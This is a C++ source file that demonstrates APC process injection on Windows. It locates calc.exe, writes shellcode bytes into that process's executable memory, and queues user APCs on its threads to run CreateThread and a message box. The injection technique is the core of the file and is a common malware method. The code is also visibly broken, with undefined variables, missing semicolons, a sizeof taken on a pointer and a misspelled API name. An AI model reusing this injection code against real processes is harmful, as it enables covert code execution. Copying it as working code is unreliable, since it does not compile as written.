#include <windows.h>
#include <TlHelp32.h>
#include <vector>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>

#pragma comment (lib, "Ws2_32.lib")                     // Need to link with Ws2_32.lib

using namespace std;

byte callMsgExe[] = {"\x55\x89\xE5\x83\xEC\x0C\xC6\x45\xFC\x48\xC6\x45\xFD\x00\xC6\x45\xF8\x46\xC6\x45\xF9\x00\x8B\x45\x08\x8B\x08\x89\x4D\xF4\x50\x6A\x00\x8D\x45\xFC\x50\x8D\x45\xF8\x50\x6A\x00\xFF\x55\x08\x83\xC4\x10\x58\x31\xC0\x89\xEC\x5D\xC3"};
byte createTExe[] = {"\x55\x8B\xEC\x83\xEC\x0C\x8B\x45\x08\x8B\x08\x89\x4D\xFC\x8B\x55\x08\x8B\x42\x04\x89\x45\xF8\x8B\x4D\x08\x8B\x51\x08\x89\x55\xF4\x50\x6A\x00\x6A\x00\x8D\x45\xF8\x50\x8D\x45\xF4\x50\x6A\x00\x6A\x00\xFF\x55\xFC\x83\xC4\x12\x58\x33\xC0\x8B\xE5\x5D\xC3"};


struct arguments{
	ULONG_PTR createThread;
	LPVOID executer;
	ULONG_PTR param;
};


bool findProcess(const char* exeName, DWORD& pid, vector<DWORD>& tids) {
    auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return false;
    pid = 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (::Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exeName) == 0) {
                pid = pe.th32ProcessID;
            	cout<<"[i] Found process ("<<exeName<<"), pid: "<<pid<<endl;
                THREADENTRY32 te = { sizeof(te) };
                cout<<"[i] Threads found to inject: ";
                if (::Thread32First(hSnapshot, &te)) {
                    do {
                        if (te.th32OwnerProcessID == pid) {
                        	cout<<te.th32ThreadID<<"  ";
                            tids.push_back(te.th32ThreadID);
                        }
                    } while (::Thread32Next(hSnapshot, &te));
                }
                cout<<endl;
                break;
            }
        } while (::Process32Next(hSnapshot, &pe));
    }
    ::CloseHandle(hSnapshot);
    return pid > 0 && !tids.empty();
}

LPVOID writeInVictim(HANDLE victimProcess, byte* data){
	LPVOID exe  = data;  ULONG size = sizeof(data);
	LPVOID addr = VirtualAllocEx(victimProcess,				// Handle to remote process
								 NULL,						// Desired starting address
								 size,						// Size of space to allocate
								 MEM_COMMIT | MEM_RESERVE, 	// Memory allocation flags
								 PAGE_EXECUTE_READWRITE);	// Memory protection flags
	if(addr==NULL) {
		cout<<"[!] memory allocation failed!"<<endl;
		exit(0);;
	}else{cout<<"[+] virtual mem allocation success"<<endl;}
	cout<<"[i] allocated memory address(for callMsgExe): 0x"<<hex<<(unsigned long)addr<<dec<<endl;

	if(!WriteProcessMemory(victimProcess,					// Target process
						  addr,								// starting address
						  data,								// data to write
						  size, 							// size of data
						  NULL)){							// pointer to get no of bytes transfered
		DWORD err = GetLastError();
		cout<<"[!] write to victim process memory failed with error: "<<dec<<err<<endl;
		exit(0);;
	}else{cout<<"[+] write to process success"<<endl;}

	return addr;
}

ULONG_PTR getAddrOf(char* function, char* module){
	HMODULE moduleHandle = LoadLibrary(module);
	if(moduleHandle==NULL){
		cout<<"[!] Failed to get handle to module '"<<module<<"'"<<endl;
		exit(0);
	}
	ULONG_PTR fnAddr = (ULONG_PTR)GetProcAddress(moduleHandle, function);
	if(fnAddr==NULL){
		cout<<"[!] failed to get "<<function<<" addr! error: "<<GetLastError()<<endl;
		exit(0);;
	}
	return fnAddr;
}

void main()
{
	DWORD pid;
	vector<DWORD> tids;

	if (findProcess("calc.exe", pid, tids)) {
		HANDLE vProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
		if(vProcess==NULL){
			cout<<"[!] failed to get handle for victim process: "<<pid<<endl;
			return;
		}

		LPVOID vMsgExeAddr = writeInVictim(vProcess, callMsgExe);
		LPVOID vCreateTExeAddr = writeInVictim(vProcess, createTExe);
		cout<<"[+] payload written to victim process"<<endl;
		cout<<"[i] msgBoxExe : 0x"<<hex<<vMsgAddr<<endl;
		cout<<"[i] createTExe: 0x"<<hex<<vCreateTExeAddr<<endl;

		ULONG_PTR msgBoxAddr = getAddrOf("MessagBoxA", "User32.dll")
		ULONG_PTR createTAddr = getAddrOf("CreateThread", "kernel32.dll")
		cout<<"[+] obtained address of functions"<<endl;
		cout<<"[i] MessagBoxA  : 0x"<<hex<<msgBoxAddr<<dec<<endl;
		cout<<"[i] CreateThread: 0x"<<hex<<createTAddr<<dec<<endl;

		cout<<"[+] Sleeping for 5s"<<endl;
		Sleep(5000);

		for(vector<DWORD>::size_type i = 0; i != tids.size() && i<4; i++) {
			DWORD tid = tids[i];
			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
			cout<<endl;

			struct arguments a = {createThreadAddr, pMsg, msgBoxAddr};
			if (hThread!=NULL) {
				if(::QueueUserAPC(
					(PAPCFUNC)pCreateT,
					hThread, 
					(LPVOID)a)==0){
					cout<<"[!] failed to queue user apc"<<endl;
				}
				else{
					cout<<"[+] user apc queued for thread (id: "<<tid<<")"<<endl;
				}
			}
			else{
				cout<<"[!] OpenThread failed to open thread (id: "<<tid<<")"<<endl;
				return;
			}
		}
		// ::VirtualFreeEx(hProcess, p, 0, MEM_RELEASE | MEM_DECOMMIT);
		cout<<"[+] VirtualFreeEx"<<endl;
	}
	else{
		cout<<"[!] specified process not found"<<endl;
	}
}